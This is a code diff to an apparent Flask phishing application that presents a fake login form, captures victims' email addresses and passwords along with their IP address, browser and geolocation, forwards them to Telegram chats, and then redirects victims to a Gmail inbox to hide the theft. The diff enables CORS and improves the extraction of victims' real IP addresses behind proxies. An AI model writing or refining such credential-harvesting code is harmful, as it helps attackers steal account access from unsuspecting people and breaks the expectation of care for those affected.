@@ -3,8 +3,12 @@ import asyncio
 import telegram
 import json
 import logging
+from flask_cors import CORS
+import requests
+
 
 app = Flask(__name__)
+CORS(app)
 app.secret_key = 'your_secret_key'
 
 # Telegram Bot Configuration
@@ -22,9 +26,14 @@ logger = logging.getLogger(__name__)
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
+        # Updated logic to retrieve the real IP address
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if user_ip:
+            # Use the first IP if multiple are forwarded
+            user_ip = user_ip.split(',')[0].strip()
+
         email = request.form['email']
         password = request.form['password']
-        user_ip = request.remote_addr or 'Unknown IP'
         user_agent = request.headers.get('User-Agent')
         location_info = get_location_from_ip(user_ip)
 
@@ -44,7 +53,6 @@ def login():
         return redirect(gmail_inbox_url)
 
     return render_template('index.html')
-
 
 async def get_chat_ids():
     offset = load_offset()
@@ -82,16 +90,15 @@ def send_telegram_message(chat_id, user_email, user_password, user_ip, user_agen
 
 
 def get_location_from_ip(ip_address):
-    import requests
     try:
-        if ip_address == '127.0.0.1':
-            ip_address = '8.8.8.8'  # Example IP for testing
+        # Fallback IP for testing locally
+        if ip_address in ['127.0.0.1', '::1']:
+            ip_address = '8.8.8.8'
         response = requests.get(f'http://ip-api.com/json/{ip_address}')
         return response.json()
     except Exception as e:
         logger.error(f"Error fetching location: {e}")
         return {'city': 'Unknown', 'country': 'Unknown', 'timezone': 'Unknown'}
-
 
 def load_chat_ids():
     try:
